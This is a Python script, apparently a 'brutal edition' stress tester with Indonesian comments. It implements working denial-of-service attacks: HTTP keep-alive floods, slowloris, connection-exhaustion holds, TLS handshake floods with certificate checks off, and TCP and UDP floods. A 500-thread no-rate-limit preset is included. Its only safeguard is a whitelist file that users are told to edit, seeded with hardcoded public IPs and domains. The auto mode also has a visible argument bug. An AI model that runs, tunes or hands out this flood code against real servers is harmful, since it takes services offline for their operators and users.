#!/usr/bin/env python3
"""
nexus-stress v2 (brutal edition) — stress/load testing tool, stdlib-only (zero deps).

METODE:
  http       L7 flood HTTP keep-alive (GET/POST/HEAD + body JSON)
  slowloris  L7 tarik-napas: buka koneksi & teteskan header (pegang koneksi server)
  hold       L7/L4 connection exhaustion: buka & PEGANG koneksi idle
  tls        L7 TLS handshake flood (negosiasi ulang TLS tiap request — berat di CPU backend)
  tcp        L4 TCP connection flood
  udp        L4 UDP packet flood (rate & ukuran jelas)
  auto       jalankan semua metode berurutan + laporan gabungan
  resolve    cek host lolos whitelist

GUARDRAIL: target WAJIB lolos whitelist /root/.nexus-stress.allow (IP / CIDR / domain).
Edit file itu untuk menambah infra milikmu sendiri. JANGAN target pihak lain.

Preset --brutal: threads=500, durasi=300s, tanpa rate-limit.
"""
import argparse, http.client, ipaddress, os, socket, ssl, statistics, sys, threading, time
from urllib.parse import urlparse

ALLOW_FILE = "/root/.nexus-stress.allow"
PROGRAM = "nexus-stress/2.0"

DEFAULT_ALLOW = """# Whitelist target milik sendiri (satu per baris: IP / CIDR / domain)
127.0.0.1
localhost
43.156.131.196
116.212.73.51
43.163.81.55
213.163.206.177
43.106.120.156
66.33.22.222
66.33.22.231
66.33.22.235
66.33.22.241
66.33.22.246
66.33.22.252
147.139.247.145
proxy.tunelnexus.biz.id
tokonexus.com
status.tokonexus.com
"""

lock = threading.Lock()
STOP = threading.Event()
M = {"ok": 0, "err": 0, "bytes": 0, "lat": [], "conn": 0}


def load_allow():
    if not os.path.exists(ALLOW_FILE):
        with open(ALLOW_FILE, "w") as f:
            f.write(DEFAULT_ALLOW)
        print(f"[guardrail] whitelist baru dibuat: {ALLOW_FILE}")
    return [l.split("#")[0].strip() for l in open(ALLOW_FILE) if l.split("#")[0].strip()]


def allowed(host):
    h = (host or "").strip().lower()
    if h in ("127.0.0.1", "localhost", "::1"):
        return True
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(h))
    except Exception:
        return False
    for ent in load_allow():
        e = ent.lower()
        try:
            if ip in ipaddress.ip_network(e, strict=False):
                return True
        except ValueError:
            pass
        if e == h:
            return True
        try:
            if ipaddress.ip_address(socket.gethostbyname(e)) == ip:
                return True
        except Exception:
            pass
    return False


def check(target):
    try:
        scheme, host, port, path = parse_target(target)
        host = host or ""
    except Exception:
        host = (target or "").strip().split("/")[0]
    if ":" in host:
        host = host.split(":")[0]
    if not allowed(host):
        sys.exit(f"\n[DITOLAK ❌] {host} tidak ada di whitelist {ALLOW_FILE}\nInfra sendiri? Tambahkan IP/domain-nya ke file itu, lalu ulangi.\n")


def mark(ok=False, err=False, lat=None, conn=None):
    with lock:
        if ok:
            M["ok"] += 1
        if err:
            M["err"] += 1
        if lat is not None and len(M["lat"]) < 50000:
            M["lat"].append(lat)
        if conn is not None:
            M["conn"] += conn


def reset_metrics():
    M.clear()
    M.update({"ok": 0, "err": 0, "bytes": 0, "lat": [], "conn": 0})


def reporter(deadline):
    prev = 0
    t0 = time.monotonic()
    while time.monotonic() < deadline and not STOP.is_set():
        time.sleep(1)
        cur = M["ok"]
        el = int(time.monotonic() - t0)
        print(f"  [{el:>3}s] ok={M['ok']:>8} ({cur-prev:>6}/s) err={M['err']:>5} conn={M['conn']:>5}", flush=True)
        prev = cur


def pct(vals, p):
    if not vals:
        return 0.0
    s = sorted(vals)
    return s[max(0, min(len(s) - 1, int(len(s) * p / 100)))]


def summary(unit="req"):
    with lock:
        lat = list(M["lat"]); ok = M["ok"]; err = M["err"]; conn = M["conn"]
    print(f"\n===== RINGKASAN ({unit}) =====")
    print(f"  total : {ok + err}  (ok={ok}, err={err})  | koneksi aktif={conn}")
    if lat:
        print(f"  latensi ms : p50={pct(lat,50)*1000:.1f}  p95={pct(lat,95)*1000:.1f}  p99={pct(lat,99)*1000:.1f}  avg={statistics.mean(lat)*1000:.1f}")
    print("======================")


def run_threads(worker, args_tuple, n, time_s):
    ts = [threading.Thread(target=worker, args=args_tuple, daemon=True) for _ in range(n)]
    for t in ts: t.start()
    for t in ts: t.join(time_s + 15)


def parse_target(t):
    """'http://host:80/path' atau 'host:port' -> (scheme,host,port,path)"""
    if "://" in t:
        u = urlparse(t)
        return u.scheme or "http", u.hostname, u.port or (443 if u.scheme == "https" else 80), u.path or "/"
    host, port = t.rsplit(":", 1)
    return "http", host, int(port), "/"


# ---------------- L7 HTTP flood ----------------
def http_worker(scheme, host, port, path, method, deadline, rps, data, fast):
    conn = None
    body = data.encode() if data else None
    headers = {"User-Agent": PROGRAM, "Connection": "keep-alive", "Accept": "*/*"}
    if body:
        headers["Content-Type"] = "application/json"
        headers["Content-Length"] = str(len(body))
    while time.monotonic() < deadline and not STOP.is_set():
        try:
            cls = http.client.HTTPSConnection if scheme == "https" else http.client.HTTPConnection
            if conn is None:
                conn = cls(host, port=port, timeout=5)
                mark(conn=1)
            t0 = time.monotonic()
            conn.request(method, path, body=body, headers=headers)
            r = conn.getresponse()
            r.read(65536)
            if fast:
                mark(ok=1)
            else:
                mark(ok=1, lat=time.monotonic() - t0)
        except Exception:
            mark(err=1)
            try: conn.close()
            except Exception: pass
            conn = None
        if rps:
            time.sleep(1.0 / rps)
    try: conn.close()
    except Exception: pass


def run_http(args, quiet=False):
    scheme, host, port, path = parse_target(args.url)
    check(args.url)
    if not quiet:
        print(f"[L7 http] {args.method} {scheme}://{host}:{port}{path} | threads={args.threads} dur={args.time}s rps/thread={args.rps or '∞'}")
    deadline = time.monotonic() + args.time
    run_threads(http_worker, (scheme, host, port, path, args.method, deadline, args.rps, getattr(args, "data", None), getattr(args, "fast", False)), args.threads, args.time)
    if not quiet:
        summary()


# ---------------- SLOWLORIS ----------------
PARTIAL = "GET {p} HTTP/1.1\r\nHost: {h}\r\nUser-Agent: {ua}\r\n"


def slowloris_worker(host, port, path, deadline, nsock, drip, tls):
    ctx = ssl._create_unverified_context()
    held = []
    for _ in range(nsock):
        try:
            s = socket.create_connection((host, port), timeout=5)
            if tls:
                s = ctx.wrap_socket(s, server_hostname=host)
            s.sendall(PARTIAL.format(p=path, h=host, ua=PROGRAM).encode())
            held.append(s)
        except Exception:
            pass
    while time.monotonic() < deadline and not STOP.is_set():
        for i, s in enumerate(list(held)):
            try:
                s.sendall(f"X-keep: {time.time()}\r\n".encode())
            except Exception:
                held.remove(s)
                try: s.close()
                except Exception: pass
        # isi ulang yang mati
        for _ in range(nsock - len(held)):
            try:
                s = socket.create_connection((host, port), timeout=5)
                if tls:
                    s = ctx.wrap_socket(s, server_hostname=host)
                s.sendall(PARTIAL.format(p=path, h=host, ua=PROGRAM).encode())
                held.append(s)
            except Exception:
                pass
        with lock:
            M["conn"] = len(held)
            if len(held) > M["ok"]:
                M["ok"] = len(held)
        time.sleep(drip)
    for s in held:
        try: s.close()
        except Exception: pass


def run_slowloris(args):
    scheme, host, port, path = parse_target(args.target)
    check(args.target)
    tls = scheme == "https"
    print(f"[L7 slowloris] {host}:{port}{path} | {args.threads}thr x {args.socks} koneksi | drip={args.drip}s dur={args.time}s tls={tls}")
    deadline = time.monotonic() + args.time
    run_threads(slowloris_worker, (host, port, path, deadline, args.socks, args.drip, tls), args.threads, args.time)
    summary("koneksi held")


# ---------------- CONNECTION HOLD ----------------
def hold_worker(host, port, deadline, tls):
    ctx = ssl._create_unverified_context()
    while time.monotonic() < deadline and not STOP.is_set():
        try:
            s = socket.create_connection((host, port), timeout=5)
            if tls:
                s = ctx.wrap_socket(s, server_hostname=host)
            mark(conn=1)
            while time.monotonic() < deadline and not STOP.is_set():
                time.sleep(1)
            try: s.close()
            except Exception: pass
            mark(ok=1)
        except Exception:
            mark(err=1)
            time.sleep(0.2)


def run_hold(args, quiet=False):
    scheme, host, port, path = parse_target(args.target)
    check(args.target)
    tls = scheme == "https"
    if not quiet:
        print(f"[L7/L4 hold] {host}:{port} | threads={args.threads} koneksi idle dipegang | dur={args.time}s")
    deadline = time.monotonic() + args.time
    run_threads(hold_worker, (host, port, deadline, tls), args.threads, args.time)
    if not quiet:
        summary("koneksi held")


# ---------------- TLS handshake flood ----------------
def tls_worker(host, port, path, deadline, rps):
    ctx = ssl._create_unverified_context()
    while time.monotonic() < deadline and not STOP.is_set():
        try:
            raw = socket.create_connection((host, port), timeout=6)
            s = ctx.wrap_socket(raw, server_hostname=host)  # full handshake baru tiap iterasi
            s.sendall(f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {PROGRAM}\r\nConnection: close\r\n\r\n".encode())
            s.recv(256)
            s.close()
            mark(ok=1)
        except Exception:
            mark(err=1)
        if rps:
            time.sleep(1.0 / rps)


def run_tls(args, quiet=False):
    scheme, host, port, path = parse_target(args.url)
    check(args.url)
    if scheme != "https":
        sys.exit("[!] mode tls butuh URL https://")
    if not quiet:
        print(f"[L7 tls-flood] TLS handshake baru tiap request -> {host}:{port}{path} | threads={args.threads} dur={args.time}s")
    deadline = time.monotonic() + args.time
    run_threads(tls_worker, (host, port, path, deadline, args.rps), args.threads, args.time)
    if not quiet:
        summary()


# ---------------- L4 TCP ----------------
PAYLOAD = b"GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n"


def tcp_worker(host, port, deadline):
    while time.monotonic() < deadline and not STOP.is_set():
        try:
            s = socket.create_connection((host, port), timeout=4)
            s.sendall(PAYLOAD)
            try: s.recv(256)
            except Exception: pass
            s.close()
            mark(ok=1)
        except Exception:
            mark(err=1)


def run_tcp(args, quiet=False):
    host, port = args.target.rsplit(":", 1)
    check(args.target)
    if not quiet:
        print(f"[L4 tcp] {host}:{port} | threads={args.threads} dur={args.time}s")
    deadline = time.monotonic() + args.time
    run_threads(tcp_worker, (host, int(port), deadline), args.threads, args.time)
    if not quiet:
        summary()


# ---------------- L4 UDP ----------------
def udp_worker(host, port, deadline, pps, size):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    pkt = os.urandom(size)
    interval = 1.0 / pps if pps else 0
    while time.monotonic() < deadline and not STOP.is_set():
        try:
            s.sendto(pkt, (host, port))
            mark(ok=1)
        except Exception:
            mark(err=1)
        if interval:
            time.sleep(interval)


def run_udp(args, quiet=False):
    host, port = args.target.rsplit(":", 1)
    check(args.target)
    total = args.pps * args.threads
    mbps = total * args.size * 8 / 1e6
    if not quiet:
        print(f"[L4 udp] {host}:{port} | {args.threads}thr x {args.pps}pps = {total}pps (~{mbps:.0f} Mbps) pkt={args.size}B dur={args.time}s")
    deadline = time.monotonic() + args.time
    run_threads(udp_worker, (host, int(port), deadline, args.pps, args.size), args.threads, args.time)
    if not quiet:
        summary("packet")


# ---------------- AUTO ----------------
def run_auto(args):
    print("=" * 60)
    print("MODE AUTO — semua metode berurutan + laporan gabungan")
    print("=" * 60)
    steps = ["http", "tcp", "udp", "post", "hold", "slowloris"]
    for step in steps:
        print(f"\n─── STEP {step.upper()} ({args.time}s) ───")
        reset_metrics()
        hostport = args.url.replace("http://", "").replace("https://", "").split("/")[0]
        if step == "http":
            run_http(argparse.Namespace(url=args.url, method="GET", threads=args.threads, time=args.time, rps=0, data=None, fast=True), quiet=False)
        elif step == "post":
            run_http(argparse.Namespace(url=args.url, method="POST", threads=args.threads, time=args.time, rps=0, data='{"test":1}', fast=True), quiet=False)
        elif step == "tcp":
            host, port = hostport.rsplit(":", 1) if ":" in hostport else (hostport, 80)
            run_tcp(argparse.Namespace(target=f"{host}:{port}", threads=50, time=args.time), quiet=False)
        elif step == "udp":
            host, port = hostport.rsplit(":", 1) if ":" in hostport else (hostport, 80)
            run_udp(argparse.Namespace(target=f"{host}:{port}", threads=2, pps=400, size=512, time=args.time), quiet=False)
        elif step == "hold":
            run_hold(argparse.Namespace(target=args.url, threads=50, time=args.time), quiet=False)
        elif step == "slowloris":
            run_slowloris(argparse.Namespace(target=args.url, threads=4, socks=25, drip=5, time=args.time), quiet=False)


# ---------------- MAIN ----------------
def main():
    ap = argparse.ArgumentParser(prog=PROGRAM, description="stress tester infra sendiri (whitelist-only) v2")
    ap.add_argument("--brutal", action="store_true", help="preset: threads=500, durasi=300s, tanpa rate-limit")
    sub = ap.add_subparsers(dest="mode", required=True)

    p7 = sub.add_parser("http", help="L7 HTTP flood")
    p7.add_argument("url")
    p7.add_argument("--method", default="GET")
    p7.add_argument("--data", default=None, help='body POST, mis. \'{"x":1}\'')
    p7.add_argument("--threads", type=int, default=10)
    p7.add_argument("--time", type=int, default=15)
    p7.add_argument("--rps", type=int, default=0)
    p7.add_argument("--fast", action="store_true", help="skip ukur latensi (throughput max)")
    p7.set_defaults(func=run_http)

    ps = sub.add_parser("slowloris", help="L7 slowloris")
    ps.add_argument("target")
    ps.add_argument("--threads", type=int, default=4)
    ps.add_argument("--socks", type=int, default=25)
    ps.add_argument("--drip", type=int, default=5)
    ps.add_argument("--time", type=int, default=60)
    ps.set_defaults(func=run_slowloris)

    ph = sub.add_parser("hold", help="L7/L4 connection exhaustion")
    ph.add_argument("target")
    ph.add_argument("--threads", type=int, default=50)
    ph.add_argument("--time", type=int, default=30)
    ph.set_defaults(func=run_hold)

    pt = sub.add_parser("tls", help="L7 TLS handshake flood (URL https://)")
    pt.add_argument("url")
    pt.add_argument("--threads", type=int, default=20)
    pt.add_argument("--time", type=int, default=15)
    pt.add_argument("--rps", type=int, default=0)
    pt.set_defaults(func=run_tls)

    p4 = sub.add_parser("tcp", help="L4 TCP flood")
    p4.add_argument("target", help="ip:port")
    p4.add_argument("--threads", type=int, default=10)
    p4.add_argument("--time", type=int, default=10)
    p4.set_defaults(func=run_tcp)

    pu = sub.add_parser("udp", help="L4 UDP flood")
    pu.add_argument("target", help="ip:port")
    pu.add_argument("--threads", type=int, default=2)
    pu.add_argument("--pps", type=int, default=500)
    pu.add_argument("--size", type=int, default=512)
    pu.add_argument("--time", type=int, default=10)
    pu.set_defaults(func=run_udp)

    pa = sub.add_parser("auto", help="semua metode berurutan + laporan gabungan")
    pa.add_argument("url")
    pa.add_argument("--threads", type=int, default=50)
    pa.add_argument("--time", type=int, default=10)
    pa.set_defaults(func=run_auto)

    pr = sub.add_parser("resolve", help="cek whitelist host")
    pr.add_argument("host")
    pr.set_defaults(func=lambda a: print(f"{a.host} ->", "DIBOLEHKAN ✅" if allowed(a.host) else "DITOLAK ❌ (tambahkan ke /root/.nexus-stress.allow)"))

    a = ap.parse_args()

    if a.brutal:
        if hasattr(a, "threads"): a.threads = 500
        if hasattr(a, "time"): a.time = 300
        print("[preset brutal] threads=500 durasi=300s tanpa-rate-limit")
    # guardrail caps
    if a.mode in ("http", "tcp", "udp", "slowloris", "hold", "tls", "auto"):
        if getattr(a, "threads", 1) > 500:
            sys.exit("[guardrail] threads max 500")
        if getattr(a, "time", 1) > 600:
            sys.exit("[guardrail] durasi max 600s")
    if a.mode == "udp" and a.pps * a.threads > 100000:
        sys.exit("[guardrail] total pps max 100k")
    if a.mode == "auto":
        a.threads = min(getattr(a, "threads", 50), 50)

    try:
        a.func(a)
    except KeyboardInterrupt:
        STOP.set()
        summary()


if __name__ == "__main__":
    main()
